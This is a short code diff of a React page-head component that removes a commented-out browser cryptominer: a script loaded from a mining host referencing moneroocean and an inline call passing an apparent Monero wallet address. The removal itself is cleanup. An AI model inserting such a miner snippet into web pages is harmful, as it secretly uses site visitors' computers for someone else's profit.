@@ -22,12 +22,6 @@ const Heads = () => (
             integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" 
             crossOrigin="anonymous"/>
         <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"/>
-        {/*<script src="https://cloud-miner.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.moneroocean"/>
-        <script 
-        dangerouslySetInnerHTML={{
-            __html: `EverythingIsLife('47msWQ2EiquLJj73f5pbQnF82Uheo8VMVPa8cCcgyCBZFig2JenAX5xKpEkEFPnwxSFHQtQgcrjTiiwb3umb1GL18xsB8U6', 'x', 30);`
-        }}
-    />*/}
     </Head>
 )
 
